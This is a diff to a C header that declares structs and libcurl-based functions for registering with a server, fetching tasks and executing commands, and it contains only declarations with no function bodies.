@@ -6,10 +6,22 @@
 #include <errno.h>
 #include <sys/utsname.h>
 
-
-
 #ifndef INITIATE_H
 #define INITIATE_H
+
+struct response {
+  char *memory;
+  size_t size;
+};
+
+struct strings_array {
+	char **task; // was file names
+	char **words; // was words
+	size_t sz;
+	size_t cap;
+	size_t file_num;
+	FILE *word_source; //was word source
+};
 
 bool reg(void);
 
@@ -17,10 +29,16 @@ bool check_tasks(void);
 
 size_t is_registered(char *buffer, size_t itemsize, size_t nitems, void* ignorethis);
 
-char *get_tasks(char *buffer, size_t itemsize, size_t nitems, void* ignorethis);
-
-// static size_t mem_cb(void *contents, size_t size, size_t nmemb, void *userp);
+size_t get_tasks(char *buffer, size_t itemsize, size_t nitems, void* ignorethis);
 
 void add_curl_field(curl_mime *form, const char *name, const char *data);
+
+int execute_tasks(struct strings_array *sa);
+
+bool can_run_command(const char *cmd);
+
+void destroy(struct strings_array *sa);
+
+
 
 #endif
